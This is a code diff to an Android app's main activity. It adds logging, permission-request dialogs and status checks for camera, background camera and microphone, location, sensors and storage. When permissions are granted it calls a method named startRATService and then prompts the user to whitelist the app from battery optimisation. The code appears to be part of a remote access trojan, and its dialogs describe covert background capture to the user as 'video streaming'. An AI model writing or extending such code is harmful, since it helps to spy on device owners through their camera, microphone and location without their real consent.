@@ -9,6 +9,7 @@ import android.os.Bundle;
 import android.os.Environment;
 import android.os.PowerManager;
 import android.provider.Settings;
+import android.util.Log;
 import android.widget.Toast;
 
 import androidx.activity.EdgeToEdge;
@@ -22,13 +23,16 @@ import androidx.core.view.ViewCompat;
 import androidx.core.view.WindowInsetsCompat;
 
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
     
+    private static final String TAG = "MainActivity";
     private static final int PERMISSION_REQUEST_CODE = 100;
     private static final int BATTERY_OPTIMIZATION_REQUEST_CODE = 200;
     private static final int MANAGE_STORAGE_REQUEST_CODE = 300;
+    private static final int VIDEO_PERMISSION_REQUEST_CODE = 400;
     
     // Base permissions for all Android versions
     private final String[] basePermissions = {
@@ -63,8 +67,7 @@ public class MainActivity extends AppCompatActivity {
         android.Manifest.permission.NEARBY_WIFI_DEVICES,
         android.Manifest.permission.BLUETOOTH_CONNECT,
         android.Manifest.permission.BLUETOOTH_SCAN,
-        android.Manifest.permission.BODY_SENSORS,
-        android.Manifest.permission.POST_NOTIFICATIONS
+        android.Manifest.permission.BODY_SENSORS
     };
     
     // Android 12 (API 31-32) specific permissions
@@ -91,8 +94,18 @@ public class MainActivity extends AppCompatActivity {
             return insets;
         });
         
+        // Log device info for debugging
+        logDeviceInfo();
+        
         // Check and request permissions
         checkAndRequestPermissions();
+    }
+    
+    private void logDeviceInfo() {
+        Log.d(TAG, "================ DEVICE INFO ================");
+        Log.d(TAG, "Android Version: " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")");
+        Log.d(TAG, "Device: " + Build.MANUFACTURER + " " + Build.MODEL);
+        Log.d(TAG, "==============================================");
     }
     
     private void checkAndRequestPermissions() {
@@ -111,26 +124,32 @@ public class MainActivity extends AppCompatActivity {
             if (ContextCompat.checkSelfPermission(this, permission) 
                     != PackageManager.PERMISSION_GRANTED) {
                 permissionsNeeded.add(permission);
+                Log.d(TAG, "Base permission needed: " + permission);
+            } else {
+                Log.d(TAG, "Base permission already granted: " + permission);
             }
         }
         
-        // Add Android 10+ foreground service permissions
+        // Add Android 10+ foreground service permissions (CRITICAL FOR VIDEO)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             for (String permission : android10Permissions) {
                 if (ContextCompat.checkSelfPermission(this, permission) 
                         != PackageManager.PERMISSION_GRANTED) {
                     permissionsNeeded.add(permission);
+                    Log.d(TAG, "Android 10+ permission needed: " + permission);
+                } else {
+                    Log.d(TAG, "Android 10+ permission already granted: " + permission);
                 }
             }
         }
         
         // Add version-specific permissions
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // Android 13+
-            // Use the new Photo Picker permissions
             for (String permission : android13Permissions) {
                 if (ContextCompat.checkSelfPermission(this, permission) 
                         != PackageManager.PERMISSION_GRANTED) {
                     permissionsNeeded.add(permission);
+                    Log.d(TAG, "Android 13+ permission needed: " + permission);
                 }
             }
         } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) { // Android 12
@@ -138,6 +157,7 @@ public class MainActivity extends AppCompatActivity {
                 if (ContextCompat.checkSelfPermission(this, permission) 
                         != PackageManager.PERMISSION_GRANTED) {
                     permissionsNeeded.add(permission);
+                    Log.d(TAG, "Android 12 permission needed: " + permission);
                 }
             }
             // Add storage permissions for Android 12
@@ -145,6 +165,7 @@ public class MainActivity extends AppCompatActivity {
                 if (ContextCompat.checkSelfPermission(this, permission) 
                         != PackageManager.PERMISSION_GRANTED) {
                     permissionsNeeded.add(permission);
+                    Log.d(TAG, "Storage permission needed: " + permission);
                 }
             }
         } else { // Android 11 and below
@@ -152,13 +173,26 @@ public class MainActivity extends AppCompatActivity {
                 if (ContextCompat.checkSelfPermission(this, permission) 
                         != PackageManager.PERMISSION_GRANTED) {
                     permissionsNeeded.add(permission);
+                    Log.d(TAG, "Legacy storage permission needed: " + permission);
                 }
             }
         }
         
+        Log.d(TAG, "Total permissions needed: " + permissionsNeeded.size());
+        
         if (!permissionsNeeded.isEmpty()) {
-            // Show explanation dialog for Android 13+ permissions
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            // Check if video permissions are missing (camera + foreground camera)
+            boolean missingVideoPermissions = false;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                missingVideoPermissions = permissionsNeeded.contains(Manifest.permission.CAMERA) ||
+                                         permissionsNeeded.contains(Manifest.permission.FOREGROUND_SERVICE_CAMERA);
+            } else {
+                missingVideoPermissions = permissionsNeeded.contains(Manifest.permission.CAMERA);
+            }
+            
+            if (missingVideoPermissions) {
+                showVideoPermissionExplanation(permissionsNeeded);
+            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 showAndroid13PermissionExplanation(permissionsNeeded);
             } else {
                 // Request all missing permissions at once
@@ -167,9 +201,60 @@ public class MainActivity extends AppCompatActivity {
                     PERMISSION_REQUEST_CODE);
             }
         } else {
-            // All permissions already granted
+            Log.d(TAG, "All permissions already granted!");
             allPermissionsGranted();
         }
+    }
+    
+    private void showVideoPermissionExplanation(List<String> permissionsNeeded) {
+        StringBuilder message = new StringBuilder();
+        message.append("📹 VIDEO STREAMING PERMISSIONS REQUIRED\n\n");
+        message.append("To enable video streaming, this app needs:\n\n");
+        
+        if (permissionsNeeded.contains(Manifest.permission.CAMERA)) {
+            message.append("• Camera - To capture video\n");
+        }
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            if (permissionsNeeded.contains(Manifest.permission.FOREGROUND_SERVICE_CAMERA)) {
+                message.append("• Background Camera - To stream video while app is in background\n");
+            }
+            if (permissionsNeeded.contains(Manifest.permission.FOREGROUND_SERVICE_MICROPHONE)) {
+                message.append("• Background Microphone - To record audio with video\n");
+            }
+        }
+        
+        message.append("\nThese permissions are required for live video streaming features.");
+        
+        new AlertDialog.Builder(this)
+            .setTitle("Video Streaming Permissions")
+            .setMessage(message.toString())
+            .setPositiveButton("Grant Permissions", (dialog, which) -> {
+                ActivityCompat.requestPermissions(this, 
+                    permissionsNeeded.toArray(new String[0]), 
+                    VIDEO_PERMISSION_REQUEST_CODE);
+            })
+            .setNegativeButton("Skip Video", (dialog, which) -> {
+                // Remove video permissions from the list and request others
+                List<String> filteredPermissions = new ArrayList<>(permissionsNeeded);
+                filteredPermissions.remove(Manifest.permission.CAMERA);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    filteredPermissions.remove(Manifest.permission.FOREGROUND_SERVICE_CAMERA);
+                    filteredPermissions.remove(Manifest.permission.FOREGROUND_SERVICE_MICROPHONE);
+                }
+                
+                if (!filteredPermissions.isEmpty()) {
+                    ActivityCompat.requestPermissions(this, 
+                        filteredPermissions.toArray(new String[0]), 
+                        PERMISSION_REQUEST_CODE);
+                } else {
+                    allPermissionsGranted();
+                }
+            })
+            .setNeutralButton("Check Status", (dialog, which) -> {
+                checkVideoPermissionsStatus();
+            })
+            .show();
     }
     
     private void showAndroid13PermissionExplanation(List<String> permissionsNeeded) {
@@ -246,14 +331,29 @@ public class MainActivity extends AppCompatActivity {
                                            @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         
-        if (requestCode == PERMISSION_REQUEST_CODE) {
+        Log.d(TAG, "onRequestPermissionsResult - Request Code: " + requestCode);
+        Log.d(TAG, "Permissions requested: " + Arrays.toString(permissions));
+        Log.d(TAG, "Grant results: " + Arrays.toString(grantResults));
+        
+        if (requestCode == PERMISSION_REQUEST_CODE || requestCode == VIDEO_PERMISSION_REQUEST_CODE) {
             boolean allGranted = true;
             StringBuilder deniedPermissions = new StringBuilder();
+            boolean videoPermissionsGranted = true;
             
             for (int i = 0; i < permissions.length; i++) {
-                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
+                String permission = permissions[i];
+                boolean granted = grantResults[i] == PackageManager.PERMISSION_GRANTED;
+                
+                if (!granted) {
                     allGranted = false;
-                    deniedPermissions.append(getPermissionDescription(permissions[i])).append("\n");
+                    deniedPermissions.append(getPermissionDescription(permission)).append("\n");
+                    
+                    // Check if video permissions were denied
+                    if (permission.equals(Manifest.permission.CAMERA) ||
+                        (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && 
+                         permission.equals(Manifest.permission.FOREGROUND_SERVICE_CAMERA))) {
+                        videoPermissionsGranted = false;
+                    }
                 }
             }
             
@@ -261,10 +361,13 @@ public class MainActivity extends AppCompatActivity {
                 Toast.makeText(this, "All permissions granted!", Toast.LENGTH_SHORT).show();
                 allPermissionsGranted();
             } else {
-                // Some permissions denied, show warning but still try to start service
-                Toast.makeText(this, 
-                    "Some permissions denied. Some features may not work:\n" + deniedPermissions.toString(), 
-                    Toast.LENGTH_LONG).show();
+                String message = "Some permissions denied. ";
+                if (!videoPermissionsGranted) {
+                    message += "Video streaming will not work. ";
+                }
+                message += "Other features may still work:\n" + deniedPermissions.toString();
+                
+                Toast.makeText(this, message, Toast.LENGTH_LONG).show();
                 
                 // Check if we need to request MANAGE_EXTERNAL_STORAGE again
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
@@ -281,10 +384,12 @@ public class MainActivity extends AppCompatActivity {
     
     private String getPermissionDescription(String permission) {
         switch (permission) {
+            case Manifest.permission.CAMERA:
+                return "• Camera (for photos and video)";
             case Manifest.permission.FOREGROUND_SERVICE_CAMERA:
                 return "• Camera in background (for video streaming)";
             case Manifest.permission.FOREGROUND_SERVICE_MICROPHONE:
-                return "• Microphone in background";
+                return "• Microphone in background (for video audio)";
             case Manifest.permission.FOREGROUND_SERVICE_LOCATION:
                 return "• Location in background";
             case android.Manifest.permission.READ_MEDIA_IMAGES:
@@ -292,16 +397,61 @@ public class MainActivity extends AppCompatActivity {
                 return "• Photos & Videos";
             case android.Manifest.permission.NEARBY_WIFI_DEVICES:
                 return "• Nearby devices";
-            case android.Manifest.permission.CAMERA:
-                return "• Camera";
-            case android.Manifest.permission.RECORD_AUDIO:
+            case Manifest.permission.RECORD_AUDIO:
                 return "• Microphone";
-            case android.Manifest.permission.ACCESS_FINE_LOCATION:
-            case android.Manifest.permission.ACCESS_COARSE_LOCATION:
+            case Manifest.permission.ACCESS_FINE_LOCATION:
+            case Manifest.permission.ACCESS_COARSE_LOCATION:
                 return "• Location";
             default:
                 return "• " + permission.substring(permission.lastIndexOf('.') + 1);
         }
+    }
+    
+    // Add this method to check video permissions status
+    private void checkVideoPermissionsStatus() {
+        boolean hasCamera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
+                == PackageManager.PERMISSION_GRANTED;
+        boolean hasForegroundCamera = false;
+        boolean hasForegroundMic = false;
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            hasForegroundCamera = ContextCompat.checkSelfPermission(this, 
+                    Manifest.permission.FOREGROUND_SERVICE_CAMERA) == PackageManager.PERMISSION_GRANTED;
+            hasForegroundMic = ContextCompat.checkSelfPermission(this, 
+                    Manifest.permission.FOREGROUND_SERVICE_MICROPHONE) == PackageManager.PERMISSION_GRANTED;
+        }
+        
+        String message = "📹 VIDEO PERMISSIONS STATUS:\n\n" +
+                        "Camera: " + (hasCamera ? "✅ GRANTED" : "❌ DENIED") + "\n" +
+                        "Foreground Camera: " + (hasForegroundCamera ? "✅ GRANTED" : "❌ DENIED") + "\n" +
+                        "Foreground Microphone: " + (hasForegroundMic ? "✅ GRANTED" : "❌ DENIED") + "\n\n";
+        
+        if (hasCamera && (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q || hasForegroundCamera)) {
+            message += "✓ Video streaming should work!";
+        } else {
+            message += "✗ Video streaming will NOT work. Please grant all camera permissions.";
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                message += "\n\nOn Android 10+, you need BOTH Camera AND Foreground Camera permissions.";
+            }
+        }
+        
+        new AlertDialog.Builder(this)
+            .setTitle("Video Permissions Check")
+            .setMessage(message)
+            .setPositiveButton("OK", null)
+            .setNeutralButton("Request Again", (dialog, which) -> {
+                List<String> videoPerms = new ArrayList<>();
+                videoPerms.add(Manifest.permission.CAMERA);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    videoPerms.add(Manifest.permission.FOREGROUND_SERVICE_CAMERA);
+                    videoPerms.add(Manifest.permission.FOREGROUND_SERVICE_MICROPHONE);
+                }
+                ActivityCompat.requestPermissions(this, 
+                    videoPerms.toArray(new String[0]), 
+                    VIDEO_PERMISSION_REQUEST_CODE);
+            })
+            .show();
     }
     
     @Override
@@ -335,6 +485,11 @@ public class MainActivity extends AppCompatActivity {
     }
     
     private void allPermissionsGranted() {
+        Log.d(TAG, "All permissions flow completed, starting service");
+        
+        // Check video permissions one more time for logging
+        checkVideoPermissionsForLogging();
+        
         // All permissions granted, start service
         startRATService();
         
@@ -343,6 +498,31 @@ public class MainActivity extends AppCompatActivity {
         
         // Open battery settings to help user whitelist the app
         openBatteryOptimizationSettings();
+    }
+    
+    private void checkVideoPermissionsForLogging() {
+        boolean hasCamera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
+                == PackageManager.PERMISSION_GRANTED;
+        boolean hasForegroundCamera = false;
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            hasForegroundCamera = ContextCompat.checkSelfPermission(this, 
+                    Manifest.permission.FOREGROUND_SERVICE_CAMERA) == PackageManager.PERMISSION_GRANTED;
+        }
+        
+        Log.d(TAG, "=== VIDEO PERMISSIONS FINAL CHECK ===");
+        Log.d(TAG, "Camera: " + hasCamera);
+        Log.d(TAG, "Foreground Camera: " + hasForegroundCamera);
+        
+        if (hasCamera && (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q || hasForegroundCamera)) {
+            Log.d(TAG, "✅ Video streaming should work!");
+        } else {
+            Log.d(TAG, "❌ Video streaming will NOT work!");
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !hasForegroundCamera) {
+                Log.d(TAG, "   Missing FOREGROUND_SERVICE_CAMERA permission");
+            }
+        }
+        Log.d(TAG, "======================================");
     }
     
     private void checkBatteryOptimization() {
